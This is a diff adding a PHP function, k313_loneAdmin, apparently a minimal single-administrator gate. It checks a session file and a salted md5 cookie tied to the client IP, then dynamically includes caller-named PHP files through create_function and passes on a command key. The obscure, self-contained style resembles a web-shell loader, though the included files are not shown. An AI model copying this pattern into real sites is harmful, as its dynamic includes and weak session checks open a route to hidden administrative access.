@@ -1,0 +1,57 @@
+<?php
+
+function k313_loneAdmin($http_keys, $pass_hash, $sess_file, $log_include, $sess_include)
+{
+  static $salt = '§2S 9=gH s!y0 treF5';
+  
+  if (define('K313_LONE_ADMIN', __DIR__.'/')) {
+    $sfile = K313_LONE_ADMIN.$sess_file;
+    if (is_file($sfile) && filesize($sfile) && 3 < count($http_keys)) {
+      $cmdkey = array_pop($http_keys);
+      $cookey = array_pop($http_keys);
+      $time = time( );
+      $incl = 0;
+      if (isset ($_POST[$http_keys[0]])) {
+        $f = fopen($sfile, 'r+b');
+        if ($f && flock($f, LOCK_EX)) {
+          $mtime = (int)fread($f, 10);
+          if (313 < $mtime && $mtime < $time - 15) {
+            $incl = 1;
+            $args = array ($f, $salt, $http_keys, $pass_hash, $cookey);
+          }
+        }
+      }
+      elseif (isset ($_COOKIE[$cookey])) {
+        $sid = $_COOKIE[$cookey];
+        if (is_string($sid)) {
+          $arr = file($sfile);
+          if ($arr) {
+            $i = count($arr);
+            while (--$i > 0) {
+              $line = trim($arr[$i]);
+              if ($time <= substr($line, 0, 10)) {
+                if (substr($line, 10, 32) === md5($sid.$salt.$_SERVER['REMOTE_ADDR'])) {
+                  $incl = 2;
+                  $args = array (substr($line, 10), $sid, $salt, $cmdkey);
+                  break;
+                }
+              }
+              else break;
+            }
+          }
+        }
+      }
+      if ($incl) {
+        $funew = create_function('$file', 'return include $file;');
+        if (2 === $incl) $fuvar = $funew($sess_include);
+        else $fuvar = $funew($log_include);
+        
+        if (is_callable($fuvar, false, $func))
+          return call_user_func_array($func, $args);
+      }
+      else return false;
+    }
+  }
+}
+
+return 313;
